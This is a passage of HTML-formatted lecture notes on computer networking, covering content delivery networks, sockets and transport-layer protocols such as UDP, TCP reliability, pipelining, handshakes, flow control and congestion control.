        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;challenge: streaming content to hundreds of simultaneous users&lt;/li&gt;
&lt;li&gt;option 1: mega server
&lt;ul&gt;
&lt;li&gt;single point of failure&lt;/li&gt;
&lt;li&gt;possible network congestion&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;option 2: store copies at multiple geographically distributed sites (CDN)
&lt;ul&gt;
&lt;li&gt;enter deep: push CDN servers into many access networks close to users (Akamai has 240,000 servers deployed in &amp;gt; 120 countries in 2015)&lt;/li&gt;
&lt;li&gt;bring home: larger clusters near access nets&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;socket-programming&#34; &gt;Socket Programming
&lt;span&gt;
    &lt;a href=&#34;#socket-programming&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;UDP: no connection nor handshake (may be lost or received out-of-order)&lt;/li&gt;
&lt;li&gt;TCP: server must be running first&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter-3-transport-layer-protocols&#34; &gt;Chapter 3 Transport Layer Protocols
&lt;span&gt;
    &lt;a href=&#34;#chapter-3-transport-layer-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Design Issues, Connectionless UDP, Principles of Reliable Data Transfer, Connection-oriented Transport TCP, Flow Control, Congestion Control&lt;/p&gt;
&lt;h3 id=&#34;transport-services-and-protocols&#34; &gt;Transport Services and Protocols
&lt;span&gt;
    &lt;a href=&#34;#transport-services-and-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;provide logical communication between application processes running on different hosts&lt;/li&gt;
&lt;li&gt;sender breaks application messages into segments passed to network layer&lt;/li&gt;
&lt;li&gt;receiver reassembles segments into messages, passes to application layer&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;12 kids in Ann&amp;rsquo;s house sending letter to 12 kids in Bill&amp;rsquo;s house, hosts = houses, processes = kids, app messages = letters in envelopes&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The network layer connects hosts, the transport layer connects processes&lt;/p&gt;
&lt;h3 id=&#34;principal-internet-transport-protocols&#34; &gt;Principal Internet Transport Protocols
&lt;span&gt;
    &lt;a href=&#34;#principal-internet-transport-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;TCP: Transmission Control Protocol
&lt;ul&gt;
&lt;li&gt;reliable, congestion control, flow control, connection setup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UDP: User Datagram Protocol
&lt;ul&gt;
&lt;li&gt;unreliable, unordered delivery, no-frills extension of &amp;ldquo;best-effort&amp;rdquo; IP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datagram: alternative name for packet (packet term should not be used in the first place)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;multiplexingdemultiplexing&#34; &gt;Multiplexing/demultiplexing
&lt;span&gt;
    &lt;a href=&#34;#multiplexingdemultiplexing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Connectionless
&lt;ul&gt;
&lt;li&gt;Single direction transfers&lt;/li&gt;
&lt;li&gt;Each datagram has an IP, and the transport-layer segment it carries contains the source and destination port number
&lt;ul&gt;
&lt;li&gt;Implication 1: System API for sockets requires a local port number&lt;/li&gt;
&lt;li&gt;Implication 2: System API for sending datagrams must have both destination IP and port #&lt;/li&gt;
&lt;li&gt;Same destination and port # corresponds to same socket at the receiver host&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Connection-oriented demultiplexing
&lt;ul&gt;
&lt;li&gt;TCP socket has a 4-tuple: (source IP, source port, dest IP, dest port)&lt;/li&gt;
&lt;li&gt;demux: receiver uses all four values to direct segment to appropriate socket (even with the same port, the segment can be directed to a different socket)&lt;/li&gt;
&lt;li&gt;Each socket can be associated with different connecting client&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;connectionless-transport&#34; &gt;Connectionless Transport
&lt;span&gt;
    &lt;a href=&#34;#connectionless-transport&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;UDP no handshaking; RFC 768&lt;/li&gt;
&lt;li&gt;UDP each segment is handled independently&lt;/li&gt;
&lt;li&gt;No connection establishment (less delays)
&lt;ul&gt;
&lt;li&gt;SImple: no connection state at sender, receiver&lt;/li&gt;
&lt;li&gt;Small header size&lt;/li&gt;
&lt;li&gt;No congestion control (as fast as desired and works in congestion)
&lt;ul&gt;
&lt;li&gt;sender not throttled&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use cases
&lt;ul&gt;
&lt;li&gt;Streaming/Multi-media (loss tolerant, rate sensitive)&lt;/li&gt;
&lt;li&gt;DNS, SNMP, HTTP/3&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Checksum
&lt;ul&gt;
&lt;li&gt;Detect errors in transmitted segment&lt;/li&gt;
&lt;li&gt;Sender treats UDP as 16-bit integer&lt;/li&gt;
&lt;li&gt;Checksum: summation&lt;/li&gt;
&lt;li&gt;Receiver: compute checksum&lt;/li&gt;
&lt;li&gt;Even if cheksum is 100%, it is still possible for a coincidental checksum bit error&lt;/li&gt;
&lt;li&gt;The checksum can remain the same even if a bit is changed in two different integers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;reliable-data-transfer&#34; &gt;Reliable Data Transfer
&lt;span&gt;
    &lt;a href=&#34;#reliable-data-transfer&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Let us invent the Reliable Data Transfer protocol (rdt)&lt;/li&gt;
&lt;li&gt;Unidirectional data flow: finite state machines to specify sender, receiver&lt;/li&gt;
&lt;li&gt;Handling errors
&lt;ul&gt;
&lt;li&gt;Wait for receiver to send the ACK before sending another packet&lt;/li&gt;
&lt;li&gt;Add acknowledgements: (ACKs) which explicitly tells sender that packet received is OK&lt;/li&gt;
&lt;li&gt;Add negative acknowledgements (NAKs) which explicitly tells sender that packet received had errors&lt;/li&gt;
&lt;li&gt;Sender can retransmit on receiving a NAK&lt;/li&gt;
&lt;li&gt;To deal with corrupted acknowledgements, sender will use sequence numbers to the packet so that the receiver can discard duplicates&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To eliminate NAK, receiver sends ACK for last pkt received OK (including sequence number), so if there is a duplicate ACK, retransmit current pkt&lt;/li&gt;
&lt;li&gt;To deal with packet loss (data or ACKs), we need a reasonable time for the ACK
&lt;ul&gt;
&lt;li&gt;Retransmit if ACK not received within a countdown, duplicate packets are handled appropriately anyways&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Performance
&lt;ul&gt;
&lt;li&gt;t =  RTT + L / R (transmission)&lt;/li&gt;
&lt;li&gt;utilization of sender busy sending = (L / R) / (RTT + L / R)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;go-back-n&#34; &gt;Go-Back-N
&lt;span&gt;
    &lt;a href=&#34;#go-back-n&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Sender:&lt;/p&gt;
&lt;p&gt;Pipelining: send multiple, &amp;ldquo;in-flight&amp;rdquo;, yet-to-be acknowledged packets which increases utilization by 3x&lt;/p&gt;
&lt;p&gt;Sender sends a window up to N, cumulative ACKs: send ACKs of all packets inclusive up to N, move window forward to begin at n+1. Use a timeout(n) to retransmit packet n and higher in the window&lt;/p&gt;
&lt;p&gt;Receiver:&lt;/p&gt;
&lt;p&gt;Send ACK of &lt;strong&gt;highest in-order&lt;/strong&gt; received sequence #. Remember only rcv_base. When receiving out-of-order packet, can either discard of buffer (implementation decision). re-ACK the packet with highest sequence number.&lt;/p&gt;
&lt;h3 id=&#34;selective-repeat&#34; &gt;Selective Repeat
&lt;span&gt;
    &lt;a href=&#34;#selective-repeat&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Another pipelining protocol. Receiver individually acknowledges all correctly packets (regardless of order). Sender maintains timer for each unACKed packet. Sender window, N consecutive sequence #s.&lt;/p&gt;
&lt;p&gt;Want to avoid resending packets that were sent properly.&lt;/p&gt;
&lt;p&gt;Problem: if the ACK is not received of the first packet, then the sender will retransmit packet0, but the receiver is expecting the next packet0 not the previous packet0.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Window size &amp;gt;= max sequence number / 2.&lt;/li&gt;
&lt;li&gt;Sequence numbers need to cover at least two window sizes.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp&#34; &gt;TCP
&lt;span&gt;
    &lt;a href=&#34;#tcp&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;reliable and in-order byte stream&lt;/li&gt;
&lt;li&gt;full duplex data
&lt;ul&gt;
&lt;li&gt;bi-directional on same connection&lt;/li&gt;
&lt;li&gt;maximum segment size&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Uses go-back-N (cumulative ACKs) protocol with pipelining&lt;/li&gt;
&lt;li&gt;full duplex data, connection-oriented
&lt;ul&gt;
&lt;li&gt;handshaking&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Usually with 500ms ACK delay for the first segment&lt;/li&gt;
&lt;li&gt;ACK is for the next expected packet number&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-segment-structure&#34; &gt;TCP Segment Structure
&lt;span&gt;
    &lt;a href=&#34;#tcp-segment-structure&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Other than source port and destination port,&lt;/li&gt;
&lt;li&gt;sequence number&lt;/li&gt;
&lt;li&gt;acknowledgement number
&lt;ul&gt;
&lt;li&gt;the next sequence number to expect (this is an ACK?)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;flow control (receive window, number of bytes receiver willing to accept)&lt;/li&gt;
&lt;li&gt;congestion notification (C, E)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-sequence-numbers&#34; &gt;TCP Sequence Numbers
&lt;span&gt;
    &lt;a href=&#34;#tcp-sequence-numbers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Q: How receiver handles out-of- order segments?&lt;/p&gt;
&lt;p&gt;A: TCP spec doesn’t say; up to implementor&lt;/p&gt;
&lt;p&gt;TCP timeout needs to be longer than the RTT, but RTT varies. You can estimate RTT by using a SampleRTT (ignore retransmissions). Average several recent measurements.&lt;/p&gt;
&lt;p&gt;Exponential weighted moving average, with alpha = 0.125.&lt;/p&gt;
&lt;p&gt;(1 - a) EstimatedRTT + a(SampleRTT)&lt;/p&gt;
&lt;p&gt;Timeout interval = Estimated RTT + 4 * DevRTT&lt;/p&gt;
&lt;p&gt;DevRTT: EWMA of SampleRTT deviation from EstimatedRTT&lt;/p&gt;
&lt;p&gt;DevRTT = (1 - Beta) *\ DevRTT + Beta *  | Sample RTT - EstimatedRTT |&lt;/p&gt;
&lt;h3 id=&#34;tcp-ack-generation&#34; &gt;TCP ACK Generation
&lt;span&gt;
    &lt;a href=&#34;#tcp-ack-generation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;First segment will not be ACKed until 500ms for next segment&lt;/li&gt;
&lt;li&gt;If a second segment is sent, ACK is sent immediately, to avoid overhead&lt;/li&gt;
&lt;li&gt;If there&amp;rsquo;s a timeout, the sender resends the first packet, but the receiver sends the &lt;strong&gt;ACK of the highest one&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Implication: sender does not retransmit for &amp;ldquo;lost&amp;rdquo; ACKs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-fast-retransmit&#34; &gt;TCP Fast Retransmit
&lt;span&gt;
    &lt;a href=&#34;#tcp-fast-retransmit&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Instead of waiting for the timer to wait-out, a three duplicate ACKs for an earlier segment will trigger retransmission&lt;/p&gt;
&lt;h3 id=&#34;tcp-3-way-handshake&#34; &gt;TCP 3-way handshake
&lt;span&gt;
    &lt;a href=&#34;#tcp-3-way-handshake&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;before exchanging data&lt;/li&gt;
&lt;li&gt;need to agree on a connection parameters (starting sequence numbers)&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Client listens on socket, chooses init sequence number x, send &lt;code&gt;SYN&lt;/code&gt; message (synchronize the initial sequence number)&lt;/li&gt;
&lt;li&gt;Server chooses init sequence number y, &lt;code&gt;SYNACK&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Client sends an ACK for the SYNACK(x) which indicated that the server is alive&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Closing the connection&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Client sends &lt;code&gt;FIN&lt;/code&gt; bit=1, seq = x&lt;/li&gt;
&lt;li&gt;Server sends &lt;code&gt;FINACK&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Server sends &lt;code&gt;FIN&lt;/code&gt; bit&lt;/li&gt;
&lt;li&gt;Client sends ACK&lt;/li&gt;
&lt;li&gt;Client waits for 2 * max segment lifetime before closing the socket&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;tcp-flow-control&#34; &gt;TCP Flow Control
&lt;span&gt;
    &lt;a href=&#34;#tcp-flow-control&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Delivery is faster than the application layer reads from the socket buffer&lt;/li&gt;
&lt;li&gt;In the TCP packet sent back to the sender, add flow control to the header of the TCP segment&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rwnd&lt;/code&gt; field. RcvBuffer size set via socket options (default is 4096)&lt;/li&gt;
&lt;li&gt;sender limits amount of unACKed data to &lt;code&gt;rwnd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-congestion-control&#34; &gt;TCP Congestion Control
&lt;span&gt;
    &lt;a href=&#34;#tcp-congestion-control&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;high delay (queueing delays)&lt;/li&gt;
&lt;li&gt;packet loss (buffer overflow)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Causes&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;premature timeout → retransmission&lt;/li&gt;
&lt;li&gt;multi-hop paths, some routers get more traffic through them&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Costs&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;additional work&lt;/li&gt;
&lt;li&gt;lower maximum throughput&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Control&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Routers provide direct feedback when flow passes through congest router&lt;/li&gt;
&lt;li&gt;TCP ECN, ATM, DECbit protocols&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;congestion-control-via-aimd&#34; &gt;Congestion Control via AIMD
&lt;span&gt;
    &lt;a href=&#34;#congestion-control-via-aimd&#34;&gt;
